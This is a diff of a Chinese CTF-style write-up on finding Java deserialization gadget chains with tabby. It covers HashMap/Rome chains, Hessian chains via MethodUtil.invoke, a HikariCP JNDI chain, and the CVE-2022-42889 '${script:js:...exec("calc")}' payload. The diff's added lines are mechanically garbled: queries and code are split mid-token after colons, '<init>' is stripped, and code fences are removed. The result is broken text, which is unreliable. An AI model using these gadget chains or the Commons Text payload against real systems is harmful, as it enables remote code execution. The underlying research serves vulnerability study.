@@ -44,8 +44,10 @@ com.example.b4bycoffee.model.CoffeeBean#toString
 
 归纳一下当前的问题，我们需要一个readObject->toString的链子，则我们可以利用tabby写出如下查询语句
 
-match (source:Method {NAME:"readObject",CLASSNAME:"java.util.HashMap"})
-match (sink:Method {NAME:"toString"})
+match (source:
+Method {NAME:"readObject",CLASSNAME:"java.util.HashMap"})
+match (sink:
+Method {NAME:"toString"})
 with source, collect(sink) as sinks
 call tabby.algo.findJavaGadget(source, sinks, 12, false) yield path where none(n in nodes(path) where n.CLASSNAME in ["javax.management.BadAttributeValueExpException","com.sun.jmx.snmp.SnmpEngineId","com.sun.xml.internal.ws.api.BindingID","javax.swing.text.html.HTML$UnknownTag"])
 return path limit 1
@@ -70,9 +72,12 @@ exp文中就不给出了，根据调用关系很容易写出来
 
 根据上述条件可以写出如下查询语句
 
-match (source:Method) where source.NAME in ["equals","hashCode","compareTo"] 
+match (source:
+Method) where source.NAME in ["equals","hashCode","compareTo"] 
 with collect(source) as sources
-match (sink:Method {IS_SINK:true}) where sink.NAME =~ "invoke" and sink.VUL =~ "CODE" and sink.CLASSNAME =~ "java.lang.reflect.Method"
+match (sink:
+Method {IS_SINK:
+true}) where sink.NAME =~ "invoke" and sink.VUL =~ "CODE" and sink.CLASSNAME =~ "java.lang.reflect.Method"
 with sources, collect(sink) as sinks
 call tabby.algo.allSimplePaths(sinks,sources, 15, false) yield path 
 where none(n in nodes(path) where (n.CLASSNAME =~ "java.util.Iterator" or n.CLASSNAME =~ "java.util.Enumeration" or n.CLASSNAME =~ "java.util.Map" or n.CLASSNAME =~ "java.util.List" or n.CLASSNAME=~"jdk.nashorn.internal.ir.UnaryNode" or n.CLASSNAME=~"com.sun.jndi.ldap.ClientId" or n.CLASSNAME=~"org.apache.catalina.webresources.TrackedInputStream"))
@@ -87,7 +92,8 @@ return path limit 1
 
 在tabby中内置了一些sink点，分析上面被ban掉的方法我们可以发现调用链长度仅仅为1，这里我们可以查一下sink点有没有直接符合要求的,这里以代码执行为例
 
-match (m1:Method) where m1.VUL="CODE" and m1.IS_STATIC=true and m1.IS_PUBLIC=true
+match (m1:
+Method) where m1.VUL="CODE" and m1.IS_STATIC=true and m1.IS_PUBLIC=true
 return m1 limit 50
 
 可以看到查询结果中 sun.reflect.misc.MethodUtil.invoke 符合我们的要求，这个方法其他wp文章中也有阐述；则可以编写exp如下
@@ -169,13 +175,17 @@ public class Test {
 
 其实本题目直接用上文tctf的原生链子就可以了，不过我们可以尝试使用tabby来跑一下HikariCP中的链子，HikariCP是个JDBC连接池组件，所以我们可以尝试跑下jndi的调用
 
-match path=(m1:Method)-[:CALL*..10]->(m2:Method {IS_SINK:true}) where m1.NAME =~ "get.*" and m1.PARAMETER_SIZE=0 and m2.VUL="JNDI" and m2.NAME="lookup"
+match path=(m1:
+Method)-[:
+CALL*..10]->(m2:
+Method {IS_SINK:
+true}) where m1.NAME =~ "get.*" and m1.PARAMETER_SIZE=0 and m2.VUL="JNDI" and m2.NAME="lookup"
 return path limit 2
 
 可以查询出很多条可用的链，排除hessian中的黑名单最后可以得到HikariCP中这样的一条
 
 com.zaxxer.hikari.HikariDataSource#getConnection()
-com.zaxxer.hikari.pool.HikariPool.<init>
+com.zaxxer.hikari.pool.HikariPool.
 com.zaxxer.hikari.pool.PoolBase.initializeDataSource
 javax.naming.InitialContext.lookup
 
@@ -186,7 +196,8 @@ CVE-2022-42889
 我们可以通过分析过往漏洞来增加我们的查找规则，这里以这几天Apache Commons Text的漏洞举一个例子，测试代码只有简短的两行
 
 StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
-interpolator.replace("${script:js:java.lang.Runtime.getRuntime().exec("calc")}");
+interpolator.replace("${script:js:
+java.lang.Runtime.getRuntime().exec("calc")}");
 
 分析过后我们可以发现该处漏洞最后是利用ScriptEngineManager来执行脚本代码的，而在tabby中其实内置sink点是没有考虑到这种情况的，所以我们可以手工在配置文件中添加sink
 
@@ -194,9 +205,12 @@ interpolator.replace("${script:js:java.lang.Runtime.getRuntime().exec("calc")}")
 
 添加后我们可以编写查询语句测试下
 
-match (source:Method) where source.NAME="replace" and source.CLASSNAME="org.apache.commons.text.StringSubstitutor"
+match (source:
+Method) where source.NAME="replace" and source.CLASSNAME="org.apache.commons.text.StringSubstitutor"
 with collect(source) as sources
-match (sink:Method {IS_SINK:true}) where sink.VUL =~ "ScriptEval"
+match (sink:
+Method {IS_SINK:
+true}) where sink.VUL =~ "ScriptEval"
 with sources, collect(sink) as sinks
 call tabby.algo.allSimplePaths(sinks,sources,10, false) yield path 
 where none(n in nodes(path) where (n.CLASSNAME =~ "java.util.Iterator" or n.CLASSNAME =~ "java.util.Enumeration" or n.CLASSNAME =~ "java.util.Map" or n.CLASSNAME =~ "java.util.List" ))
@@ -227,75 +241,41 @@ this.list.add(ObjectBean.class.getName());
 this.list.add(ToStringBean.class.getName());
 this.list.add(TemplatesImpl.class.getName());
 this.list.add(Runtime.class.getName());
-```
-
-
-
-```
 java.util.HashMap#readObject
 java.util.HashMap#hash
 com.rometools.rome.feed.impl.EqualsBean#hashCode
 com.rometools.rome.feed.impl.EqualsBean#beanHashCode
 com.example.b4bycoffee.model.CoffeeBean#toString
-```
-
-
-
-```
-match (source:Method {NAME:"readObject",CLASSNAME:"java.util.HashMap"})
-match (sink:Method {NAME:"toString"})
+match (source:
+Method {NAME:"readObject",CLASSNAME:"java.util.HashMap"})
+match (sink:
+Method {NAME:"toString"})
 with source, collect(sink) as sinks
 call tabby.algo.findJavaGadget(source, sinks, 12, false) yield path where none(n in nodes(path) where n.CLASSNAME in ["javax.management.BadAttributeValueExpException","com.sun.jmx.snmp.SnmpEngineId","com.sun.xml.internal.ws.api.BindingID","javax.swing.text.html.HTML$UnknownTag"])
 return path limit 1
-```
-
-
-
-```
 java.util.HashMap#readObject
 java.util.HashMap#putVal
 java.lang.Object#equals
 com.sun.org.apache.xpath.internal.objects.XString#equals
 com.example.b4bycoffee.model.CoffeeBean#toString
-```
-
-
-
-```
 1.hessian可反序列化不继承自Serializable的类
 2.反序列化的起始方法可以为 equals,hashCode,compareTo 方法
 3.反序列化时不能恢复Iterator,Enumeration,Map,List类型的值
-```
-
-
-
-```
-match (source:Method) where source.NAME in ["equals","hashCode","compareTo"] 
+match (source:
+Method) where source.NAME in ["equals","hashCode","compareTo"] 
 with collect(source) as sources
-match (sink:Method {IS_SINK:true}) where sink.NAME =~ "invoke" and sink.VUL =~ "CODE" and sink.CLASSNAME =~ "java.lang.reflect.Method"
+match (sink:
+Method {IS_SINK:
+true}) where sink.NAME =~ "invoke" and sink.VUL =~ "CODE" and sink.CLASSNAME =~ "java.lang.reflect.Method"
 with sources, collect(sink) as sinks
 call tabby.algo.allSimplePaths(sinks,sources, 15, false) yield path 
 where none(n in nodes(path) where (n.CLASSNAME =~ "java.util.Iterator" or n.CLASSNAME =~ "java.util.Enumeration" or n.CLASSNAME =~ "java.util.Map" or n.CLASSNAME =~ "java.util.List" or n.CLASSNAME=~"jdk.nashorn.internal.ir.UnaryNode" or n.CLASSNAME=~"com.sun.jndi.ldap.ClientId" or n.CLASSNAME=~"org.apache.catalina.webresources.TrackedInputStream"))
 return path limit 1
-```
-
-
-
-```
 1.目标方法需要为public 和 static的
 2.sink可以为代码执行，写文件，远程类加载等
-```
-
-
-
-```
-match (m1:Method) where m1.VUL="CODE" and m1.IS_STATIC=true and m1.IS_PUBLIC=true
+match (m1:
+Method) where m1.VUL="CODE" and m1.IS_STATIC=true and m1.IS_PUBLIC=true
 return m1 limit 50
-```
-
-
-
-```
 package test;
 
 import com.caucho.hessian.io.Hessian2Input;
@@ -366,43 +346,26 @@ public class Test {
         hessian2Input.readObject();
     }
 }
-```
-
-
-
-```
-match path=(m1:Method)-[:CALL*..10]->(m2:Method {IS_SINK:true}) where m1.NAME =~ "get.*" and m1.PARAMETER_SIZE=0 and m2.VUL="JNDI" and m2.NAME="lookup"
+match path=(m1:
+Method)-[:
+CALL*..10]->(m2:
+Method {IS_SINK:
+true}) where m1.NAME =~ "get.*" and m1.PARAMETER_SIZE=0 and m2.VUL="JNDI" and m2.NAME="lookup"
 return path limit 2
-```
-
-
-
-```
 com.zaxxer.hikari.HikariDataSource#getConnection()
-com.zaxxer.hikari.pool.HikariPool.<init>
+com.zaxxer.hikari.pool.HikariPool.
 com.zaxxer.hikari.pool.PoolBase.initializeDataSource
 javax.naming.InitialContext.lookup
-```
-
-
-
-```
 StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
-interpolator.replace("${script:js:java.lang.Runtime.getRuntime().exec("calc")}");
-```
-
-
-
-```
+interpolator.replace("${script:js:
+java.lang.Runtime.getRuntime().exec("calc")}");
 {"name":"javax.script.ScriptEngine", "rules": [{"function": "eval", "type": "sink", "vul": "ScriptEval", "actions": {}, "polluted": [0], "signatures": ["<javax.script.ScriptEngine: java.lang.Object eval(java.lang.String)>"]}]}
-```
-
-
-
-```
-match (source:Method) where source.NAME="replace" and source.CLASSNAME="org.apache.commons.text.StringSubstitutor"
+match (source:
+Method) where source.NAME="replace" and source.CLASSNAME="org.apache.commons.text.StringSubstitutor"
 with collect(source) as sources
-match (sink:Method {IS_SINK:true}) where sink.VUL =~ "ScriptEval"
+match (sink:
+Method {IS_SINK:
+true}) where sink.VUL =~ "ScriptEval"
 with sources, collect(sink) as sinks
 call tabby.algo.allSimplePaths(sinks,sources,10, false) yield path 
 where none(n in nodes(path) where (n.CLASSNAME =~ "java.util.Iterator" or n.CLASSNAME =~ "java.util.Enumeration" or n.CLASSNAME =~ "java.util.Map" or n.CLASSNAME =~ "java.util.List" ))
